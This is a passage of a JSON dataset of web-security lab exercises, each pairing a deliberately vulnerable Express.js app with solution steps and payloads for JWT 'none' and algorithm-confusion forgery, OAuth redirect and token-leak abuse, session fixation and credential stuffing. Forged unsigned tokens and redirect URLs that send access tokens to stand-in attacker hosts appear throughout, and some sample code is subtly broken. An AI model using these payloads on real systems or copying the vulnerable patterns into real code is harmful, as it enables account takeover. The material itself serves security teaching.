        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }, { username: 'user', password: 'user123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.payload?.role === 'admin') res.send('Welcome to admin dashboard'); else res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
        "payloads": [
          "{ \"alg\": \"none\" }.<payload with role=admin>.",
          "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leads to account takeover via third-party redirect",
        "Lab Description": "The application implements OAuth login but fails to validate the 'redirect_uri' and 'state' parameters. It is possible to manipulate the OAuth flow to bind an attacker-controlled third-party account to the victim’s session. To solve: Trick the system into linking your OAuth identity to Carlos's account, then access his dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to intercept and explore the OAuth login flow initiated by the victim.",
          "2. Identify the request URL that contains the redirect_uri and state parameters.",
          "3. Modify the redirect_uri to point to your controlled OAuth identity and remove the state parameter entirely.",
          "4. Send the crafted link to the OAuth endpoint with Carlos's session token attached (stolen or guessed via browser cache/sniffing).",
          "5. After the system binds your OAuth identity to Carlos’s account, access the victim dashboard directly."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = {}; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=xyz`); }); app.get('/callback', (req, res) => { const { code, user } = req.query;  users[user] = { oauthBound: true }; res.send(`OAuth bound to ${user}`); }); app.get('/dashboard', (req, res) => { const { user } = req.query; if (users[user]?.oauthBound) res.send(`Welcome ${user}, your OAuth is active.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
        "payloads": [
          "https://target.com/auth?redirect_uri=https://attacker.com/callback&user=carlos",
          "https://target.com/callback?code=xyz&user=carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "The application uses predictable session IDs and does not invalidate the session token after login. This allows an attacker to set a session ID before victim login and later hijack the session. To solve: Fixate the session ID before Carlos logs in, then reuse that session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to initiate a login process without submitting credentials to obtain a session ID from the Set-Cookie header.",
          "2. Send a phishing link with the fixed session ID cookie to Carlos.",
          "3. Once Carlos logs in, intercept and reuse the same session ID.",
          "4. Replay the session using the cookie to access the /my-account endpoint.",
          "5. Confirm access by viewing Carlos’s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('Session Fixation Lab running on http://localhost:5000'));",
        "payloads": [
          "Set-Cookie: sid=12345; path=/",
          "Reuse sid=12345 after victim logs in",
          "Access /my-account with Cookie: sid=12345"
        ]
      },
      {
        "Lab scenario": "Session fixation via cookie injection in login workflow",
        "Lab Description": "The application does not invalidate user sessions upon authentication. Instead, it continues using any pre-authenticated session identifier, even if it was injected beforehand. The application uses cookie-based sessions without regeneration upon login. To solve: Hijack a session by fixing a session ID before victim login and access Carlos's account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login request and inject a crafted session cookie (e.g., sessionid=attacker1234). Forward the request.",
          "2.Share a phishing link with Carlos pointing to the login page. Carlos logs in while the sessionid=attacker1234 is already set.",
          "3.After Carlos logs in, the application does not regenerate the session ID and continues using the fixed value.",
          "4.Use the same session ID (attacker1234) in your browser and send a GET /my-account request.",
          "5.If successful, Carlos’s authenticated session will be accessible using the fixed session ID."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { let sid = req.cookies.sessionid || 'guest'; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><input type='hidden' name='sid' value='${sid}'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password, sid } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.cookie('sessionid', sid); res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Carlos account details'); res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab on port 3000'));",
        "payloads": [
          "sessionid=attacker1234",
          "Injected session cookie before login",
          "Phishing link with pre-set cookie"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm exploit in Authorization header",
        "Lab Description": "The backend uses JWT tokens for stateless authentication, but fails to enforce a valid algorithm for signature verification. If a token is submitted with the 'alg' field set to 'none', the backend accepts it without validating the signature. To solve: Forge a valid token for Carlos using the 'none' algorithm and access his protected resource.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Burp Suite or Postman to intercept a request with a valid JWT in the Authorization header.",
          "2.Decode the token using jwt.io or a custom script and extract the payload and header.",
          "3.Modify the header to set 'alg' to 'none' and set the payload to {\"username\": \"carlos\"}.",
          "4.Remove the signature part entirely and reconstruct the JWT as header.payload.",
          "5.Send the forged token in the Authorization header and access GET /account.",
          "6.Confirm successful bypass by verifying Carlos’s account details are visible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') { return res.send('Carlos account accessed'); } else { return res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [header].[payload].",
          "JWT with alg=none, no signature"
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via referrer",
        "Lab Description": "This lab implements OAuth 2.0 using the implicit grant flow. Access tokens are returned in the URL fragment, but a redirect leads to a third-party domain which leaks the token via the Referer header. To solve: Extract Carlos’s access token from a leaked Referer and use it to access his data.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP to passively scan and identify OAuth redirect flows in the login mechanism.",
          "2.Trigger an OAuth login using your own account and observe the redirection chain. Note where the access_token appears in the URL.",
          "3.Observe that after the redirect, the application sends the user to a third-party analytics subdomain, leaking the fragment in the Referer header.",
          "4.Set up a listener or check browser dev tools to capture the Referer header containing Carlos’s token.",
          "5.Use the stolen token to craft an Authorization: Bearer header and send a request to GET /api/user-info.",
          "6.Verify access to Carlos’s protected data using the token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<script>location.href='https://analytics.lab.com/track?ref='+document.location.href</script>`; res.send(html); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') return res.send('Sensitive data for Carlos'); res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Token Leakage Lab running on port 3000'));",
        "payloads": [
          "https://oauth-provider.com/callback#access_token=carlos-access-token",
          "Referer: https://analytics.lab.com/track?ref=https://callback#access_token=carlos-access-token",
          "Authorization: Bearer carlos-access-token"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm exploit in session verification",
        "Lab Description": "The application uses JWTs to manage authenticated sessions, but it incorrectly allows tokens with the 'alg':'none' header to be accepted as valid. The application verifies tokens without validating the signature when 'none' is specified. To solve: forge a valid session token for the user 'admin' and access the admin dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept the login request using Burp Suite and inspect the JWT token returned in the Set-Cookie header.",
          "Copy the token to jwt.io and decode it. Observe the structure and headers. Notice the alg is set to HS256.",
          "Modify the JWT header to use 'alg':'none' and set the payload to {\"username\":\"admin\"}. Remove the signature part of the token.",
          "In Burp, replace the session cookie in a request to /admin with the modified unsigned JWT and send the request.",
          "If successful, the admin dashboard is displayed. Confirm by observing admin-only features or messages."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'user' }, secret); res.cookie('session', token); res.send('Logged in'); }); app.get('/admin', (req, res) => { try { const token = req.cookies.session; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "This application does not regenerate session cookies after login. An attacker can set a session ID before login and trick the victim into logging in with it, allowing session fixation. To solve: fixate Carlos's session and access their profile using the same session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Visit /login and inspect the cookie set before login. Note the 'session' cookie is issued pre-auth.",
          "Use a tool like Postman to set a session cookie manually before login.",
          "Send a crafted link to Carlos with the session cookie already injected via a custom header or Burp's proxy.",
          "After Carlos logs in, reuse the same session ID to access /profile.",
          "Verify successful access to Carlos's profile and account information."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.session || Math.random().toString(36); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\" /></form>'); }); app.post('/login', (req, res) => { const username = req.query.username; const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Carlos profile data'); else res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "Set-Cookie: session=attackerSessionID;",
          "GET /login HTTP/1.1\\nCookie: session=attackerSessionID",
          "Manually inject session=attackerSessionID into Burp’s cookie editor before victim logs in"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referrer header in implicit flow",
        "Lab Description": "The app implements OAuth using the implicit grant type and returns access tokens in the URL fragment. Due to misconfigured redirects, tokens are leaked through the referrer header when loading external resources. To solve: capture an access token for the victim and use it to access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use a Burp Collaborator payload or webhook.site URL to craft an OAuth redirect_uri pointing to your domain.",
          "Send the link to the victim (Carlos) to simulate clicking an OAuth login.",
          "When Carlos logs in, observe that the access_token is returned in the URL fragment.",
          "Due to misconfiguration, a subsequent redirect or resource request includes this token in the Referrer header.",
          "Intercept the request to your server, extract the leaked token, and use it in a Bearer Authorization header to access Carlos’s profile via the API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token123-carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token123-carlos') { res.send('Sensitive data for Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://webhook.site/your-custom-id",
          "GET /profile HTTP/1.1\\nAuthorization: Bearer token123-carlos",
          "Observe Referrer header leakage in requests from victim to external domains"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via alg=none in REST API login",
        "Lab Description": "The application uses JWTs to manage user sessions, but incorrectly allows the use of the 'none' algorithm. The `/api/login` endpoint accepts a username and password, returning a signed JWT. However, the server fails to validate the JWT signature properly when `alg` is set to `none`. The application treats the payload as valid without verifying the signature. To solve: forge a JWT that grants access to Carlos’s account using the `alg=none` technique.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman or Burp Suite to log in as a regular user and capture the JWT from the `/api/login` response.",
          "Decode the JWT using jwt.io and inspect its header and payload to observe the `HS256` algorithm and user claim.",
          "Modify the JWT header to set `alg` to `none` and change the payload `username` claim to `carlos`.",
          "Remove the signature section entirely and base64 encode the new header and payload, joining them with a dot.",
          "Send the modified JWT as a bearer token to `/api/my-account` and verify if access to Carlos’s data is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }, { username: 'wiener', password: 'p@ssword' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'supersecretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.header?.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'carlos') return res.send('Sensitive data for carlos'); } else { try { const verified = jwt.verify(token, 'supersecretkey'); if (verified.username === 'carlos') return res.send('Sensitive data for carlos'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
          "header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
        "Lab Description": "The application integrates a third-party OAuth provider for login using the `response_type=token` flow. However, it redirects the full access token to a third-party endpoint using an insecure redirect URI. This allows an attacker to intercept tokens by registering a malicious domain. To solve: craft a redirect URI pointing to a server you control and extract Carlos’s access token upon login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a request logger (e.g., requestbin, Burp Collaborator) to collect access token leaks.",
          "Inspect the OAuth login request and note the redirect_uri parameter vulnerability (no allowlist).",
          "Craft a malicious OAuth authorization URL with `redirect_uri` set to your logging endpoint and `response_type=token`.",
          "Send the URL to Carlos via phishing or social engineering to induce login via the vulnerable flow.",
          "Capture the access token from the request sent to your server and use it to access `/oauth/account` with an Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('access-token-for-carlos').toString('base64'); return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid flow'); }); app.get('/oauth/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'access-token-for-carlos') return res.send('OAuth Account Data: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "https://malicious.example.com#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
          "https://attacker.site#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
          "https://requestbin.net/#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M="
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in GraphQL login",
        "Lab Description": "This application exposes a GraphQL endpoint for user authentication. Upon visiting the site, a fixed session cookie is assigned regardless of user identity. The server does not invalidate or regenerate the session after login, allowing a malicious user to predetermine a victim's session ID. To solve: predefine Carlos’s session ID, get him to log in using it, then hijack the session and access his dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to analyze the session management behavior before and after login at `/graphql`.",
          "Notice that session cookies are not changed on successful login.",
          "Force the application to issue a fixed session ID (e.g., sessionid=attacker1234) by sending a crafted request as a guest.",
          "Convince Carlos to authenticate using the session cookie you created (e.g., via phishing link or XSS).",
          "Once logged in, reuse the session cookie to access `/graphql` as Carlos and extract account data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); let sessions = {}; app.post('/graphql', (req, res) => { const session = req.cookies.sessionid || 'guest-' + Math.random().toString(36).substr(2); res.cookie('sessionid', session); const query = req.body.query; if (query.includes('login')) { const { username, password } = JSON.parse(query.match(/\\{.*\\}/)[0]); if (username === 'carlos' && password === 'hunter2') { sessions[session] = 'carlos'; return res.send({ data: { login: true } }); } return res.send({ data: { login: false } }); } else if (query.includes('dashboard')) { if (sessions[session] === 'carlos') return res.send({ data: { account: 'carlos profile' } }); return res.status(403).send({ error: 'Not authenticated' }); } res.send({ data: {} }); }); app.listen(4000);",
        "payloads": [
          "Cookie: sessionid=attacker1234",
          "GraphQL login mutation with credentials: { login(username: \"carlos\", password: \"hunter2\") }",
          "GraphQL query with sessionid=attacker1234: { dashboard { account } }"
        ]
      },
      {
        "Lab scenario": "Session fixation in OAuth flow",
        "Lab Description": "The application uses OAuth for third-party login integration, but it fails to regenerate the session identifier after authentication. The application stores session tokens in cookies without proper rotation. To solve: Fixate your own session ID before login, then coerce the victim (Carlos) to authenticate via OAuth and capture their session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and intercept the login process via OAuth. Capture your session cookie before initiating authentication.",
          "Send the OAuth login initiation request to Burp Repeater. Note the session ID cookie (e.g., session=abc123).",
          "Craft a phishing link pointing to /auth/redirect with your fixated session cookie set. Trick Carlos into clicking it.",
          "Once Carlos completes the OAuth login flow, his session will be bound to your session ID.",
          "Use the captured session to access Carlos's /my-account page and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); app.get('/auth/redirect', (req, res) => { const user = { username: 'carlos' }; req.session.user = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account page for ${req.session.user.username}`); else res.status(403).send('Not authorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Phishing URL: /auth/redirect with session=abc123",
          "Cookie injection: session=abc123 before login",
          "OAuth flow replay using fixated session"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion",
        "Lab Description": "This lab implements JWT-based authentication using the 'HS256' algorithm. However, the server fails to validate the token's algorithm field. To solve the lab, forge a JWT using the 'none' algorithm and access Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Log in with your own credentials and intercept the issued JWT using Burp.",
          "Decode the JWT at jwt.io and observe the algorithm field in the header.",
          "Replace the algorithm with 'none' and change the payload to { \"username\": \"carlos\" }.",
          "Remove the JWT signature completely.",
          "Replay the modified unsigned JWT to access the protected /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const payload = jwt.decode(token.replace('Bearer ', '')); req.user = payload; next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username === 'carlos') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
          "Unsigned JWT token: base64(header).base64(payload).",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Multi-step credential stuffing with email discovery",
        "Lab Description": "This lab simulates a login form that leaks registered emails through the password reset feature. The login system does not implement account lockout, allowing credential stuffing attacks. To solve the lab, enumerate Carlos's email, then brute-force his password and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the POST /forgot endpoint. Submit various usernames and capture variations in the response (e.g., 200 OK vs 404).",
          "Confirm Carlos's email/username is valid by analyzing the response behavior.",
          "Send POST /login request to Burp Intruder. Add a position marker around the password field.",
          "Load a large password list and configure Intruder to use grep match for successful logins (e.g., 302 redirect).",
          "Once successful login credentials are found, access Carlos's /my-account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ email: 'carlos@example.com', password: 'dragon' }]; app.post('/forgot', (req, res) => { const { email } = req.body; const user = users.find(u => u.email === email); if (user) res.send('Reset link sent'); else res.status(404).send('User not found'); }); app.post('/login', (req, res) => { const { email, password } = req.body; const user = users.find(u => u.email === email && u.password === password); if (user) res.redirect('/my-account'); else res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { res.send('Carlos account page'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Credential Stuffing Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "POST /forgot with carlos@example.com",
          "Intruder password list: rockyou.txt",
          "Credential combo: carlos@example.com:dragon",
          "Grep match: 302 redirect or presence of 'My account'"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in stateless API",
        "Lab Description": "The stateless REST API uses JSON Web Tokens (JWTs) for authentication but fails to validate the 'alg' field correctly. The backend trusts the token header and doesn't enforce algorithm restrictions. The application decodes JWTs without verifying the signature if the algorithm is set to 'none'. To solve: Forge a valid admin token and access the /admin-dashboard endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to log in and intercept the Authorization: Bearer <JWT> header for a regular user.",
          "Copy the JWT and decode it using jwt.io to observe the 'alg' field and payload structure.",
          "Replace 'alg' value in header with 'none', and change payload role to 'admin'. Remove signature part.",
          "Send modified JWT using Postman with Authorization header to /admin-dashboard endpoint.",
          "Verify successful access by retrieving sensitive data from the admin panel."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }, { username: 'wiener', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Invalid user'); const token = jwt.sign({ username: user.username, role: user.role }, 'supersecret'); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { return res.send('Welcome to the admin panel'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via unregenerated session ID after login",
        "Lab Description": "This web application accepts a user-provided session ID via the Cookie header. Upon successful login, the server does not regenerate the session ID, enabling session fixation. To solve: Fixate Carlos’s session ID before he logs in, then use that session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to proxy login and observe that session cookies are accepted from clients pre-auth.",
          "Craft a GET / request with Cookie: sessionId=fixed123 and confirm the same session persists after login.",
          "Convince Carlos to log in using a shared session (e.g., a phishing link or reflected XSS vector).",
          "Once Carlos logs in, reuse the fixed123 session ID to access /my-account.",
          "Validate success by retrieving account details of Carlos from /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sessionId || 'guest'; res.cookie('sessionId', sid); res.send('Welcome guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionId; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username === 'carlos') res.send('Sensitive account info for Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: sessionId=fixed123",
          "POST /login with Cookie: sessionId=fixed123 and credentials for carlos",
          "GET /my-account with Cookie: sessionId=fixed123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access_token to referrer",
        "Lab Description": "This application uses OAuth for login with an external provider but fails to correctly isolate the access_token from insecure referrer leaks. When redirected after authentication, the token is included in the URL fragment which gets exposed in referrer headers. To solve: Harvest Carlos's OAuth token and use it to impersonate him via the API.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate OAuth login and capture the redirect containing the token in the fragment.",
          "Host a malicious iframe endpoint and trick Carlos into clicking a link to the login page.",
          "Monitor the referrer header on your malicious domain to leak the OAuth access_token.",
          "Replay the stolen access_token using Postman to access GET /api/user-info.",
          "Confirm access by retrieving Carlos's personal data from the API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { data: 'Carlos personal data' } }; const tokens = { 'valid-token-carlos': 'carlos' }; app.get('/login/oauth-callback', (req, res) => { const token = req.query.token; res.redirect(`https://target-app.com/#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const username = tokens[token]; if (username) { res.json({ user: username, data: users[username].data }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
        "payloads": [
          "https://target-app.com/#access_token=valid-token-carlos",
          "GET /api/user-info with Authorization: Bearer valid-token-carlos",
          "<iframe src='https://target-app.com/login/oauth-callback?token=valid-token-carlos'></iframe>"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion attack in Authorization header",
        "Lab Description": "This lab uses JWTs for stateless session handling and verifies tokens in the Authorization header using the 'alg' field. The server trusts the algorithm declared in the JWT itself. The application uses asymmetric signing (RS256) but fails to enforce key verification. To solve: forge a valid JWT that grants admin privileges by exploiting the algorithm confusion.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in and capture the JWT issued in the Authorization header for a low-privileged user.",
          "In Burp Decoder, decode the JWT and observe the 'alg':'RS256' header and user role 'user'.",
          "Craft a new JWT header with 'alg':'HS256' and sign it using the public key as the HMAC secret.",
          "Change payload to set role:'admin'. Sign the modified token using HMAC with the public key as the key.",
          "Replace the original token in the Authorization header with the forged one and access /admin endpoint to confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); const users = [{ username: 'user', password: 'userpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Token required'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') return res.send('Welcome Admin'); return res.status(403).send('Insufficient privileges'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
